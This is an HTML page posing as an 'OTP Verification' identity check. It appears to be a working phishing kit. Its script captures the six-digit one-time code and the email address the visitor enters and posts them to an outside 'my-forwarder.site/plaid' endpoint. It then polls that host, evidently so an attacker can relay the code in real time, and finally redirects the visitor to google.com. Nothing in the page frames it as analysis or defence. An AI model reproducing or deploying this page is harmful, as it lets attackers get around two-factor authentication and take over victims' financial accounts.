<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #f7fafc;
            color: #1a202c;
            line-height: 1.5;
        }
        
        .container {
            max-width: 420px;
            margin: 40px auto;
            padding: 0 20px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            height: 60px;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .otp-input-container {
            display: flex;
            justify-content: space-between;
            margin: 25px 0;
            gap: 10px;
        }
        
        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .otp-input:focus {
            border-color: #2563eb;
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }
        
        .otp-input.filled {
            border-color: #2563eb;
            background-color: #f8fafc;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #2563eb;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .submit-btn:hover {
            background-color: #1d4ed8;
        }
        
        .submit-btn:disabled {
            background-color: #94a3b8;
            cursor: not-allowed;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            display: none;
        }
        
        .throbber {
            width: 50px;
            height: 50px;
            border: 5px solid #e2e8f0;
            border-top: 5px solid #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #dc2626;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: #fef2f2;
            border-radius: 6px;
            display: none;
        }
        
        .success-message {
            text-align: center;
            color: #16a34a;
            margin: 30px 0;
        }
        
        .email-display {
            background-color: #f1f5f9;
            padding: 12px;
            border-radius: 6px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Logo">
        </div>
        
        <div class="card">
            <h1>Verify Your Identity</h1>
            
            <div class="email-display">
                <span id="displayed-email">user@example.com</span>
            </div>
            
            <p style="text-align: center; margin-bottom: 10px; color: #64748b;">
                Enter the 6-digit code sent to your email
            </p>
            
            <form id="otp-form">
                <div class="otp-input-container">
                    <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" data-index="6" autocomplete="off" inputmode="numeric">
                </div>
                
                <button type="submit" id="submit-btn" class="submit-btn" disabled>
                    Verify Code
                </button>
                
                <div id="error-message" class="error-message"></div>
            </form>
        </div>
        
        <div class="loading-overlay" id="loading-overlay">
            <div class="throbber"></div>
            <p>Verifying your code...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get elements
            const otpForm = document.getElementById('otp-form');
            const otpInputs = document.querySelectorAll('.otp-input');
            const submitBtn = document.getElementById('submit-btn');
            const loadingOverlay = document.getElementById('loading-overlay');
            const errorMessage = document.getElementById('error-message');
            const emailDisplay = document.getElementById('displayed-email');
            
            // Get URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            const verificationCode = urlParams.get('code');
            const email = urlParams.get('email');
            
            // Set email if available
            if (email) {
                emailDisplay.textContent = decodeURIComponent(email);
            }
            
            // OTP input handling
            otpInputs.forEach((input, index) => {
                // Handle paste
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').trim();
                    if (/^\d{6}$/.test(pasteData)) {
                        pasteData.split('').forEach((char, i) => {
                            if (otpInputs[i]) {
                                otpInputs[i].value = char;
                                otpInputs[i].classList.add('filled');
                            }
                        });
                        checkOtpComplete();
                        otpInputs[5].focus();
                    }
                });
                
                // Handle input
                input.addEventListener('input', (e) => {
                    if (input.value.length === 1 && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                    input.classList.toggle('filled', input.value.length > 0);
                    checkOtpComplete();
                });
                
                // Handle backspace
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });
            
            // Check if OTP is complete
            function checkOtpComplete() {
                const complete = Array.from(otpInputs).every(input => input.value.length === 1);
                submitBtn.disabled = !complete;
                return complete;
            }
            
            // Form submission
            otpForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (!checkOtpComplete()) return;
                
                const otp = Array.from(otpInputs).map(input => input.value).join('');
                showLoading(true);
                hideError();
                
                try {
                    const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            otp: otp,
                            verification_code: verificationCode,
                            email: email
                        })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json().catch(() => ({}));
                        throw new Error(errorData.message || `Server error: ${response.status}`);
                    }
                    
                    const data = await response.json();
                    
                    if (data.status === 'pending') {
                        // Start polling for verification status
                        pollVerificationStatus(verificationCode);
                    } else {
                        handleVerificationResult(data);
                    }
                } catch (error) {
                    console.error('Verification error:', error);
                    showError(error.message || 'Connection error. Please try again.');
                    showLoading(false);
                }
            });
            
            // Poll for verification status
            function pollVerificationStatus(code) {
                let attempts = 0;
                const maxAttempts = 30; // 30 attempts (2.5 minutes total)
                const pollInterval = 5000; // 5 seconds
                
                const poller = setInterval(async () => {
                    attempts++;
                    
                    try {
                        const response = await fetch(
                            `https://my-forwarder.site/plaid/otp-check.php?code=${code}&_=${Date.now()}`
                        );
                        
                        if (!response.ok) throw new Error(`HTTP ${response.status}`);
                        
                        const data = await response.json();
                        
                        if (data.status !== 'pending') {
                            clearInterval(poller);
                            handleVerificationResult(data);
                        } else if (attempts >= maxAttempts) {
                            clearInterval(poller);
                            throw new Error('Verification timed out');
                        }
                    } catch (error) {
                        console.error('Polling error:', error);
                        clearInterval(poller);
                        showError('Connection interrupted. Please refresh and try again.');
                        showLoading(false);
                    }
                }, pollInterval);
            }
            
            // Handle verification result
            function handleVerificationResult(data) {
                showLoading(false);
                
                if (data.status === 'success') {
                    // Show success message
                    const successHTML = `
                        <div class="success-message">
                            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M22 11.08V12C21.9988 14.1564 21.3005 16.2547 20.0093 17.9818C18.7182 19.709 16.9033 20.9725 14.8354 21.5839C12.7674 22.1953 10.5573 22.1219 8.53447 21.3746C6.51168 20.6273 4.78465 19.2461 3.61096 17.4371C2.43727 15.628 1.87979 13.4881 2.02168 11.3363C2.16356 9.18457 2.99721 7.13633 4.39828 5.49707C5.79935 3.85782 7.69279 2.71538 9.79619 2.24015C11.8996 1.76491 14.1003 1.98234 16.07 2.86" stroke="#16a34a" stroke-width="2" stroke-linecap="round"/>
                                <path d="M22 4L12 14.01L9 11.01" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                            <h2>Verification Successful!</h2>
                            <p>You will be redirected shortly...</p>
                        </div>
                    `;
                    
                    otpForm.innerHTML = successHTML;
                    
                    // Redirect after 3 seconds
                    setTimeout(() => {
                        window.location.href = "https://google.com";
                    }, 3000);
                } else {
                    showError(data.message || 'Verification failed');
                    setTimeout(() => window.location.reload(), 3000);
                }
            }
            
            // UI helpers
            function showLoading(show) {
                loadingOverlay.style.display = show ? 'flex' : 'none';
            }
            
            function showError(message) {
                errorMessage.textContent = message;
                errorMessage.style.display = 'block';
            }
            
            function hideError() {
                errorMessage.style.display = 'none';
            }
        });
    </script>
</body>
</html>
